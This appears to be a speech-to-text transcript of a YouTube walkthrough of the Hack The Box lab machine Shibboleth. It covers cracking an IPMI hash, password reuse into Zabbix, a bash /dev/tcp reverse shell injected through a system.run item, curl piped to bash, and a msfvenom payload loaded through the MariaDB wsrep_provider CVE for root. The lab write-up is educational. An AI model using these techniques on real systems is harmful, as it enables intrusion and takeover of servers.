 what's going on youtube this is ipsec i'm doing shiblets from hack the box which its entry points is probably one of my favorite in a long time and technically it's just password reuse but in order to get the password you have to exploit the ipmi interface and i use exploit lightly because even though the i in ipmi stands for intelligent it is not a intelligent protocol because you don't have to exploit it you just give it a valid username and it sends you some data back that you can crack in order to get the password of that user it's a really stupid protocol and its exploitation was super big in like 2013 time frame but you still find a lot of servers especially like hp ones and companies that have open ipmi access that you can go and brute force your way in and compromise the server that way but in this box you get a password through ipmi login to zabix create a malicious check in order to get a shell in the box and then exploit a cve and my sequel to prives through so that being said let's jump in as always we start off with the nmap so dash sc for default scripts sv enumerate versions oh a output all formats play in the nmap directory and call it shibboleth and then the ip address of 1010 11.124 this can take some time to run so i've already ran it looking at the results we see just one port open it's http on port 80 it's running apache and the http titled nmap script tells us the hostname is shibboleth.htb so if we tried to go to this ip address in our web browser so 1010 11.124 it redirects us to shiblet.hdb which doesn't exist so let's go and add that into our etsy host file so 1010 11.124 put it in shiblet.htb save it and then refresh and we get a page so this is just a standard bootstrap page it looks like a pretty basic template for the website we see a lot of lorem ipsum here so just trying to find out where unique content is normally at the bottom of sites they have some type of contact information we can get usernames so maybe like white s johnson or maybe anderson we don't know the actual username template but if i find a login form i take these usernames and try to find if i can find any valid users we have a contact form here so i'm just going to say my name is ipsec root ipsec.rocksport email hello test we can test that this form works before even going into burp i like just to open up the like web developer tools and firefox we can see the request it makes it makes a post to contact.php and we get unable to load php email form library so i'm going to try going to shibboleth dot htb slash contact.php and we get a not found so nothing there um let me try index.php it's not that index.html so it looks like just a complete static website um we can run now go buster so go buster dir for directory mode dash u http shibboleth.htb um word list opt sec list discovery web content raph small words out file we can call this gobuster.out and extensions we can say html so we find other html pages in case any exist and we keep going down there is a newsletter so we can try subscribing here and i think it just sent us back i only see get request here there is this post actually uh request so i just sent a post to index and did not really get any response back um i expected like you've subscribed to a newsletter or something so without any of that i'm just going to move on we do have an email info at example.com that is not going to help us location doesn't seem to help us but at the very bottom we do have powered by enterprise monitoring solutions based upon zabbix and bare metal bmc automation so whenever i see bmc i think of like lights out management devices it's a way to have remote access to the physical components of a server they call it like remote hands because you can do things like look at the chassis open check hard drives if any have failed or any component has failed like fans hard drive memory cpu you can check the temperature you can physically push the button will not physically push the button but you can trigger the same thing that pushing the button power button on the server does so you have like remote access to the physical components of the server through um this type of thing and every service calls it differently like i want to say oracle calls it ilam and hp i think calls it ilo dell calls it idrac i mean they're all different but they seem to love the eyes i don't know exactly why because well the i always stands for like integrated i think idrac is like integrated dell remote access control or something like that while ilo is just integrated lights out management um things like that but we want to find that host we got to find like if it has an ilo and we already know virtual host routing's in play because it directed us to shiblit.htb so i'm going to try to um enumerate the virtual host i'm going to use wfuzz for this because it gives me a lot of flexibility so virtual host routing depends on this host header so we can just do host um fuzz dot shibboleth dot htb dash u give it the url shibboleth dot htb and the word list we want to used op sec list discovery dns and what about dns do we want subdomains dot million let's do five thousand dot text so now with this running we want to filter some results and normally i go for characters but we see the characters is changing and it looks like it's changing based upon the length so like these two are the same and it's 292 sip is two characters less than video and it's 290 so i'm guessing the error message these guys are getting or the three or two redirect these guys are getting does have the subdomain that we're trying to access which gives it different characters however every subdomain is just one word so i'm going to filter based upon words so we can do hw and i think it was 26 it was and now we have w fuzz running along with gearbuster and we have a few hits already monitor monitoring zabbix we can go access those so if i go sudo vi etsy host we can say monitor.shibboleth.htb then dot monitoring.shibboleth dot htb and zabex dot shibboleth dot hdb so we can try accessing each of these so man i should just put shiblet on my clipboard um martin that's a zabbix let's try monitoring and we can try zabx.shiblet.hdb um zabex.shibboleth dot htv there we go so everything is going back to the same thing um the one new thing i do notice about this is we have the xavix version uh copyright of 2021 it's now 2022 so i know this is running some type of out-of-date software because xavix has had a release in 2022 i believe so not much there the other piece i want to hurt upon is all that ipmi or bmc stuff and a lot of euler's you can either access them through some type of web interface that's like the modern way to access it but a lot of them do fall back to something called ipmi um i forget exactly what ipmi is for i think it's intelligent port management interface intelligent platform management interface oh i was close so a lot of euler devices do utilize ipmi and the intelligent piece is hilarious because um let's see ipmi uh crack hash let's see if i get a page here real quick rapid7 so you can read this but um the ipmi protocol is a challenge response that is deeply flawed so if you give it a valid username it's going to hash something back to you using the password of that username so you just take the response back and you can crack it or maybe it's the challenge you take the whatever the api uh ipmi sends you data you take that data you crack it and you get the password so um it's not really an exploit because it's like just abusing the protocol like you're not doing anything unintended you don't send it a unique packet to get the password hash you just send it a valid user and it sends you the password hash back it's really stupid really old and a lot of people don't disable it so it affects a lot of servers if you access like hp's or dells you probably have seen this protocol but um let's do dash s capital u i'm going to try 6 21 10 10 11 124 uh that's not it is it 623 is the port for this and you could just do like nmap su and find it eventually but udp scans take a while and um yeah they're not reliable either but you could do this and eventually 623 will come back as open so we know ipmi is there and the best way to do it is just msf so um let's just run metasploit there are python scripts to do it as well to dump a hash because again it's not an exploit we could also run ipmi tool authenticate with the usernames and [Music] extract the hash via wireshark but really metasploit is how i do it whenever i do so i'm going to search ipmi and there is cipher zero and this is an actual flaw in the ipmi to bypass authentication but a lot of times it's vulnerable to both dumb hashes and cipher zero and i would rather dump the hash than bypass authentication because either the password is going to be default and the default password on like dell servers is calvin but i think dell has done a good job at disabling them lately i uh hp servers the default is like eight alphanumeric characters and all the letters are capitals so this key space is really small and it's like an md5 some so you can run through the whole key space of hp servers really quickly if you get that hash and then if they've of course like set up the ilo to authenticate to active directory which some have because some people use ad as an auth for the ilo interface and when they do that you can crack their domain credentials which are great so um let's do this show options let's see set output hashcat file to be [Music] we'll just call it um home hdb shibboleth ipmi dot out and all we need is give it is the r host so our hearst 1010 11.124 because it's already going to wait that's a pass file do we have an ipmi users file show options what the heck oh yeah the very bottom one so i think it's going to try to crack and get users but we only want it to get users let's see what happens if i run it so we have a hash found administrator and here's the challenge response so we pass this over to hashcat so let's see do i have hashcat installed on this let's see if i can do it on my vm i probably can't actually because um i don't have the right cpu driver installed so i'm gonna see if the kraken is online if it isn't i'm gonna go down and power it on so um be right back through the power of video editing i have now magically powered on this server and we can do a cd hash cap to go into my hashcat directory and we can just put hashes slash we'll call it shibboleth and put the ipmi hash there that metasploit gave us we can say dot slash cat uh hash's shibleth and the dictionary file we'll use is just rock you so let's see if we have audio detect if it understands the hash right away if not we'll have to do a help and identify so auto detect failed us so we can do um let's see is it dash dash example hashes like that there we go put it over to less and i'm going to search for ipmi and this is what it is example hash it looks like we don't do username and that's maybe why it did not detect it it's mode 7300 so i'm also going to add dash dash username to this and that's going to tell hashcat that my hash has a username in front of the hash and [Music] that may allow it to auto-detect and it looks like it did so we have recovered one out of one we can just scroll up and see the password is i love pumpkin pie one we could also just do hash cat and then dash dash shell and i think that will um i thought that was going to do it do i do it like without the username like that username there we go i think i did not put a space between hash's shiblets and show so this would just show all the hashes in your pot file um that's what hash cat calls it pot file where the passwords are stored and we have i love pumpkin pie one here so let's try authenticating to that so i'm going to exit metasploit and i'm going to run ipmi tool now i installed this in app it's probably not default so if you do app search ipmi tool you can find the package right here so ipmi tool dash h and we can see all the commands so we're gonna want um [Music] like a host so it's probably dash capital h so we can see let's see i know there's a host parameter first hearst let's see dash h is hers name so dash capital h sarah's name uh lowercase h would be help it's funny i gave it capital h here but didn't give an argument so it displayed the help anyways so we want dash capital h for host name and then probably username and password so capital p and capital u so we do ipmi tool h 10 10 11 124 dash u administrator dash capital p i love pumpkin pie one was it pumpkin or pumpkin i love pumpkin i think they misspelled that they misspelled that or my eyes are playing tricks on me but always copy and paste passwords and invalid username administrator so there's also something else we can do i think it's dash capital i interface to use let's try this real quick land plus is that it see is land plus a thing interfaces lan plus okay h let's just try to query something i'm going to try chassis unable to establish connection administrator pumpkin pie one i'm thinking i have this correct but maybe i don't ping 10 10 11 124 that is the host did i typo the username ssh cap oh capital a is this where was i let's try get rid of everything try capital a because i did get invalid username and then unable to establish connections if i do capital a we have requested privilege level exceeds limit so it does successfully authenticate but now let's try man plus there we go i'm not getting an error message because i didn't provide a command so this is behaving much more like i expected and we could try something like um power and it's going to say hey we need to do a command so if i want to turn off the server we could potentially do power off reset to reboot we can query the status but this tool um looks like the ipmi doesn't let us do that so i'm going to go into a shell so i just specify land plus and do shell now it's just a bit easier to query it we can say chassis and then status to see if the chassis open and looks like everything is erroring another thing we could do is potentially look for other user names so if i look at this we can say where is it i know there's a user yeah so i can say user and it's going to want us to have extra things so i'm going to say user list to list all the usernames on this um ipmi and we just have administrator so there's really not much more we can do with this um so i'm going to test for credential reuse so i'm going to try administrator and then i love um let's just copy the password so copy this paste and we get loaded into zabbix and this is something we have looked into plenty of times before so we should know what xavix is i want to say twice maybe just once um the zipper box but xavix does have it's like a monitoring solution and a lot of monitoring solutions need commands to know if something's up or down so having administrative privilege to zabx is almost always going to relate to local code execution because well you have to be able to create commands for it to know how to monitor things so i'm just going to google zabbix system run command see if we get something zabbix remote commands system run syntax probably something here we can do um system underscore or system.run and then the command so the key piece is finding out where to input this um i want to say it's under actions can we create a new action let's see operator let's do test conditions wonder if system.run now this would be a trigger we probably have to create a trigger here oh let's see if we go into a host we should be able to see the things that it's already monitoring so if i go to items right here so we can see it's running all these commands the xavix command system cpu util net if so we can try like a system run um see is there any system runs system.run doesn't look like it so what i'm going to do is just click on one of these and we will clone it so if i click clone it's going to create a new task i'm going to call this shell and we're going to give it the key system.run and i guess we can do a reverse shell so let's go over to our host and make a shell that's a bit more friendly so echo dash n bash dash i dev tcp ten ten fourteen eight slash nine thousand one zero and one like that and then base 64-w zero and i always like getting rid of these special characters so i put a space here to get rid of this plus and then i can put a space here here man i feel like i screwed that up but uh it looks like it's fine let's try um nc lvnp 9001 echo dash n base64-d pipe over to bash we get our shell so i am good let's start netcat back up and we'll put this as the system run command okay i put two i injected in the wrong spot so now it's single quote like that okay enabled it should run every minute i believe i'm just going to click test see if this works get value and test a string is not submittable c for type numeric float bash not found i'm guessing that's a um error i'm just going to do ben bash see if this finds then bash not found let's see what if i just do echo1 let's keep it simple do test get value echo not found i type string let's say text get rid of that what happens here system run echo1 system.run comma mode i wonder if i need echo1 if it needs to end with a comma there we go let's try taking that comma out what happens still seems to be working okay whatever let's try this again test get value and that does not work what if it doesn't like the pipe let's see where is bash maybe in user bin bash try doing that then error we still don't have a um oh there we go not found still man this is getting annoying uh let's try curl girl 10 10 14 8 nine thousand one test not found so use a bin curl i wonder if i'm doing this like the wrong way is a netcat you know this box definitely has ping so ping 10 10 14 8 um is it ping dash c1 yep dash c1 there we go sudo tcp dump dash i ton zero icmp let's just add a v and n to disable dns resolution get value what if it doesn't like spaces no echo one worked like that works right now it's not add the comma select system.run okay i'm just going to copy this whole thing i wonder if it's not quotes if the quotes are screwing it up that would be the silliest thing ever test invalid second parameter let's get rid of that second parameter there test get value oh my god you don't put a quote there that that's uh embarrassing it looks like soon as um [Music] the check finishes though the shell dies so what i'm going to do is i'm going to try getting a double shell so as soon as the shell comes back we're going to try to do a shell again if that doesn't work we're going to have to try other things to convert our shell to a different process okay test get value send another this one should be like 9002 i guess let's see let's see lvnp 9002 or shoot my laziness is gonna be the death of me so get valium test let's do this send it boom and do they both die looks like this one got the exit but this one lived so i won that race the first try awesome uh you could probably also um what is it no hop let's see help no hop is that a command uh which no hup yes that is so if i did nc lvmp 9001 and enter command we did like no hub bash let's see if this works or maybe have to edit that base64 get value we have it and it does so let's see the best way i know is just spawning a process as soon as it comes back and then you'll be in a new process so when xavix kills the one um you still have a shell it's sloppy but it works it's not stupid if it works uh import pty pty dot spawn bend bash like that sdty raw minus echo fg there we go we can export term is equal to x terms so we can clear the screen but i do want to go back one second here and look at this because um like i was debating in my head if i should like cut the video and redo it and not make the mistakes but i think there was a good troubleshooting lesson we learned here like i was typing this from like memory of doing system run and then the command and you'd always think oh here's where you put quotes but the way i fixed that was doing it the way it's intended right like i clicked select went to the actual system.run command to do it the correct way because if you do it through the gui chances are you're not going to give it expect like unexpected data so like when i did this and then put the echo here it suddenly worked um that was like a good way to troubleshoot so whenever you have issues kind of follow that methodology i think like i had a super complicated payload which was the reverse shell i took that away with an echo i still failed then i went through the normal route of doing it through the gui so hopefully that makes sense of like why i troubleshoot it the way i did but now that we're here um i probably want to get into the xavix database so i'm going to go to etsy zabex because xavix does have my sequel so if i do sslmtp crap 3306 we have it listening here so i'm trying to find the configuration to access the mysql database and we see it's in this zabxserver.com file but we can't access it it's readable by root or ipmi dash service we have the ipmi password so let's just try suing to them i love what was it i love pumpkin pie one yes and that's it so the password was just a password reuse of i love pumpkin pie one and now we're ipmi service and we could read the user.txt we can also at this point create an ssh directory probably and get a regular shell let's see ipmi yeah he has been bash so if i created.state put my ssh key here we can just ssh in the box but i'm relatively happy with this um shell so i'm gonna go etsy zabix yet again and now we can read this zabik server configuration and see if there's any other xavix users i'm going to do a grep v and we'll say anything that begins with a pound sign and then a grep period to say anything oh grip sv anything that does not begin with a comment and then gret period any line that begins with data and this is a good way to just filter things out and we have a dbuser and db password we can also check sudo if i do sudo l i love pumpkin pi one uh we can't run sudo but we can go into my sequel so dash u zabx dash p put in this password show databases use zabbix and then show tables let's see we have users so i'm going to do describe users and we can say select star from users and normally i don't like select star from users um because it gets us all this data and we could do like was it name and password from users uh not password maybe hash what is it passwd so we could have done this way and got a bet bit clearer thing and we may want to try cracking this password but one thing that i've recently started doing a lot in my sequel is instead of doing a semicolon if you do backslash capital g it displays it in a table form so this is a bit easier to read than the other way just hindsight tells me i know this password is not crackable so we're not going to go down this route but it is something i would have spent time in actually doing so what we actually want to do i'm going to try running lynn p's to see if it gets us anything i'm actually not positive if it does i haven't ran lin p's against this box before but um let's see if it finds the privesque vector uh it's ps and g we want to go to releases download linps.sh we can save it and then let's see we can get rid of this tcp dump make dirt dub dub dub move downloads lin p's python3 dash m http server and we can curl 10 10 14 8 slash linps.s8 type it over to bash and we also have to specify port 8000 so i'm going to pause the video let this thing run and then we're going to go over the results okay now that lin piece is done let's go back to the top of the output and go through this the very first thing it says it's vulnerable to cve 2021 3560 which i believe is pwn kit aka pk exec or maybe it should be pk exec aka phone kit either way the way you identify this vulnerability is not reliable because pk exec did not increment the version additionally um it may not be set uid if i do which pk exec lsla pk exec let's see if it is set uid it is not so even if this is a vulnerable version which it looks like it may be based upon the date i don't know oh yeah 2021. this is a vulnerable version of pk exec because it's last year i was thinking like this year but no um this is last year and it's not set uid so even if we exploited it we wouldn't get to a different user so we can just completely ignore that let's do curl go back to the top and keep going through so even though it's vulnerable it's not going to give us anything exploit linux suggester we can go through each of these potentially baron sam edit this is a heap-based overflow potentially screen this is a 2017 cve i know it's not vulnerable to that so i don't have a lot of faith in that whole exploit list going over things we don't see anything too interesting these are highlighted just because i don't know it's some regular expression that needs some work there's nothing that's exploited by being 17 star or something like that that's just default chrome stuff um i mainly skip down to like set uids other things just seeing if anything sticks out doesn't look like anything does curl is highlighted because i'm searching tmux for curl that's how i got to the very top mariadb.com apache sites we could look at other sites but looks like we have them all the zabx the monitoring things like that analyzing doesn't seem to be that much um right around the time this box did get created there was a my sequel privesque and instead of just going through all of um lin p's i'm just going to show detecting the version and then show lynn peace doesn't have it and maybe we'll submit a pull request in the future to add this check to lynn p's or maybe linux exploit suggester would be the correct spot to add it because lynn p's runs that script so let's get the password to my sequel again real quick run my sequel we try logging in it tells us the version of mariadb is 10 3 2 5 if we search this every now and then you get lucky and you find vulnerabilities and main software that you would not expect to have a main vulnerability um let's see let's exploit to it uh my keyboard stop typing there we go we have a github page of this ws rep provider way to execute commands and it has us do msn venom to create a malicious library then we open up netcat and copy the library there and just set a option in my sql this ws rep thing to this library and suddenly it magically executes if we look at the cve let's pull this up see the date cve go to google we can see my sequel uh before 10 3 2 7 so it gives a bunch of versions that it is potentially vulnerable to but let's just try this exploit out so i'm going to go to a different thing a different pane and we're going to copy that msf venom command actually before we do um and you can take my word that um lin p's isn't finding it if we just search for my sequel let's see it should have a version check somewhere my sequel empty come on up here there's a lot of stuff i would expect to see the finding around here if it was in lin peace and it's not so um yeah let's go back to msf venom and that's not a dig at the tool um i like showing those things because you can't always depend on the tools sometimes you just gotta try silly things like googling a banner with exploit and finding it so el host will do 10 10 14 8 l port 9001 it's elf we can leave that file name there and because we have this underscore here so it's x64 shell underscore reverse tcp this is a stage list payload which means we don't have to use exploit handler if we use the payload x64 shell reverse tcp we'd have to run metasploits exploit multi-handler and catch the shell that way because we're not actually sending the full shell when it's a staged payload but since it's stageless we can just catch this with netcat um yeah let's just run this it should give us an l file in dub dub dub which we can download so let's do curl 10 10 14 8 8 000 slash the cve output file let's just put it in oh i don't know if i want to put it in temp i'm going to do device hm so you did actually write that i did so the reason why i don't want to put it in temp is because systemd has this thing considered like private temp directories because a lot of applications write to temp and you don't want two applications being able to read the same data they write in temp so systemd a lot of times will put things in jails and those things are like this systemd private we can see time sync resolve login d halo and apache uh we don't see my sql here so there is no jail for that um and jail is probably the wrong term it's probably like a ch root or something like that but if i went to slash temp from apache it would put me into this systemd private directory and not into slash temp so that's why i wrote this exploit to dev shm because if there was a private for my sequel then i'd be screwed so um yeah because anytime i'd reference slash temp it would be going to my sql step hopefully that makes sense i think it does makes sense in my head so let's do this login again put in the password and then it just wants us to run that set command right set global and they use slash temp and we know it would have worked but devas hm i think is more reliable okay and see lvnp 9001 and boom we get a login and we are root so i just go to root and get root texan that is it so hope you guys enjoyed that video take care and i will see you all next time